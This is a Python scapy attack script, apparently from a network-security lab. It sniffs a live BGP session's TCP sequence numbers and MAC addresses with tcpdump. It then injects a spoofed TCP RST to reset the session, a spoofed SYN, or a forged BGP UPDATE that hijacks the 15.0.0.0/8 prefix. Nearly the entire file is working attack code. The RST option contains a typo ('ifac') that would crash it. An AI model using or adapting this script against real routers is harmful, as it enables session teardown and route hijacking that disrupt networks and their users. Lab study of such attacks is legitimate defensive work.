#!/usr/bin/env python

import termcolor as T # grey red green yellow blue magenta cyan white
import os
import sys
import ctypes

from subprocess import Popen, PIPE
from scapy.all import *
from random import randint

load_contrib("bgp")


SOURCE_ADDRESS = '9.0.1.2'
DESTINATION_ADDRESS = '9.0.1.1'


def log(s, col="green"):
	print T.colored(s, col)


def send_rst_packet(iface, srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, seqNum, ackNum, win):
	log('sending RST packet\n%s:%s -> %s:%s SN %s AN %s' % (srcIP, srcPort, dstIP, dstPort, seqNum, ackNum), 'red')

	tcp = TCP(flags="RA")
	tcp.sport=int(srcPort)
	tcp.dport=int(dstPort)
	tcp.seq=int(seqNum)
	tcp.ack=int(ackNum)
	tcp.window=int(win)

	spoofed_packet = IP(dst=dstIP, src=srcIP, ttl=1)/tcp

	frame = Ether(src=srcMac, dst=dstMac)/spoofed_packet

	frame.display()

	sendp(frame, iface=iface)


def send_syn_packet(iface, srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, seqNum, ackNum, win):
	log('sending SYN packet\n%s:%s -> %s:%s SN %s AN %s' % (srcIP, srcPort, dstIP, dstPort, seqNum, ackNum), 'red')

	# swapping ports
	srcPort, dstPort = dstPort, srcPort

	tcp = TCP(flags="S")
	tcp.sport=int(srcPort)
	tcp.dport=int(dstPort)
	#tcp.sport=179
	#tcp.dport=randint(1025,65535)
	tcp.seq=0
	tcp.ack=0
	tcp.window=int(win)

	spoofed_packet = IP(dst=dstIP, src=srcIP, ttl=255)/tcp

	frame = Ether(src=srcMac, dst=dstMac)/spoofed_packet

	frame.display()

	sendp(frame, iface=iface)


def send_update_packet(iface, srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, seqNum, ackNum, win):

	srcPort=int(srcPort)
	dstPort=int(dstPort)
	seqNum=int(seqNum)
	ackNum=int(ackNum)

	paORIGIN = BGPPathAttribute(flags = 0x40, type = 1, attr_len = 1, value = '\x00')

	# PathAttribute [AS -SEQ (2)][ ASN# (1)][ ASN (300)]
	#paAS = BGPPathAttribute(flags = 0x40, type = 2, attr_len = 4, value = '\x02\x01\x00\x03')
	paAS = BGPPathAttribute(flags = 0x50, type = 2, attr_len = 6, value = '\x02\x01\x00\x00\x00\x03')

	# Path Next Hop [IP (9.0.1.2)]
	paNEXTHOP = BGPPathAttribute(flags = 0x40 , type = 3, attr_len = 4, value = '\x09\x00\x01\x02')

	# Multiple Exit Discriminator [0000]
	paMED= BGPPathAttribute(flags = 0x80 , type = 4, attr_len = 4, value = '\x00\x00\x00\x00')

	paBGPU = BGPUpdate(tp_len = 28, total_path = [paORIGIN , paAS , paNEXTHOP, paMED], nlri = [(8 , '15.0.0.0')])

	spoofed_packet = IP(dst = dstIP, src = srcIP, ttl = 255)/\
		TCP(dport = dstPort, sport = srcPort, flags = "PA", seq = seqNum, ack = ackNum)/\
		BGPHeader(len = 53, type = 2)/\
		paBGPU

	frame = Ether(src=srcMac, dst=dstMac)/spoofed_packet

	frame.display()

	sendp(frame, iface=iface)


def extract_address_port(value):
	values = value.split('.')

	address = values[0] + '.' + values[1] + '.' + values[2] + '.' + values[3]

	port = values[4]

	return address, port


def extract_ports_and_numbers(row, srcIP, dstIP):
	srcPort, dstPort, seqNum, ackNum, win = None, None, None, None, None

	values = row.split(' ')

	a = values[2].split('.')
	srcAddr = '.'.join(a[0:4])

	b = values[4].replace(':', '').split('.')
	dstAddr = '.'.join(b[0:4])

	if srcAddr == srcIP and dstAddr == dstIP and values[7] == 'seq':
		srcPort = a[4]
		dstPort = b[4]

		values[8] = values[8].replace(',', '')

		if ':' in values[8]:
			seqNum = values[8].split(':')[1]
		else:
			seqNum = values[8]

		ackNum = values[10].replace(',', '')

		win = values[12].replace(',', '')

	return srcPort, dstPort, seqNum, ackNum, win


def retrieve_atk1_mac_address(iface):
	p = Popen(('ifconfig'), stdout=PIPE)

	for row in iter(p.stdout.readline, b''):
		if iface in row:
			values = row.split(' ')

			p.kill()

			return values[5]

	p.kill()

	return None


def extract_r2_mac_addresses(row, ip_address):
	values = row.split(' ')

	if ip_address in values[9]:
		return values[1].replace(',','')

	if ip_address in values[11]:
		return values[3].replace(',','')

	return None


def retrieve_r2_mac_address(iface, ip_address):
	p = Popen(('sudo', 'tcpdump', '-i', iface, '-lnSe'), stdout=PIPE)

	r2_mac_address = None

	for row in iter(p.stdout.readline, b''):
		r2_mac_address = extract_r2_mac_addresses(row, ip_address)

		if r2_mac_address != None:
			p.kill()

			break

	return r2_mac_address


def retrieve_ports_and_numbers(iface, srcIP, dstIP):
	p = Popen(('sudo', 'tcpdump', '-i', iface, '-lnS'), stdout=PIPE)

	srcPort, dstPort, seqNum, ackNum, win = None, None, None, None, None

	for row in iter(p.stdout.readline, b''):
		srcPort, dstPort, seqNum, ackNum, win = extract_ports_and_numbers(row, srcIP, dstIP)

		if srcPort and dstPort and seqNum and ackNum and win:
			p.kill()

			return srcPort, dstPort, seqNum, ackNum, win

		srcPort, dstPort, seqNum, ackNum, win = None, None, None, None, None


def main():
	choise = int(sys.argv[1])
	assert choise >= 1
	assert choise <= 3

	src_mac_address = retrieve_atk1_mac_address('atk1-eth0')
	#src_mac_address = retrieve_atk1_mac_address('atk1-eth1')
	assert src_mac_address is not None
	print 'source MAC address', src_mac_address

	dst_mac_address = retrieve_r2_mac_address('atk1-eth0', '9.0.0.2')
	#dst_mac_address = retrieve_r2_mac_address('atk1-eth1', DESTINATION_ADDRESS)
	assert dst_mac_address is not None
	print 'destination MAC address', dst_mac_address

	srcPort, dstPort, seqNum, ackNum, win = retrieve_ports_and_numbers('atk1-eth1', SOURCE_ADDRESS, DESTINATION_ADDRESS)
	assert srcPort is not None
	assert dstPort is not None
	assert seqNum is not None
	assert ackNum is not None
	assert win is not None
	print 'source port', srcPort
	print 'destination port', dstPort
	print 'sequence number', seqNum
	print 'acknowledge number', ackNum
	print 'window', win

	iface = 'atk1-eth0'

	if choise == 1:
		send_rst_packet(ifac, src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum, win)
	elif choise == 2:
		send_syn_packet(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum, win)
	else:
		send_update_packet(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum, win)


if __name__ == "__main__":
	main()
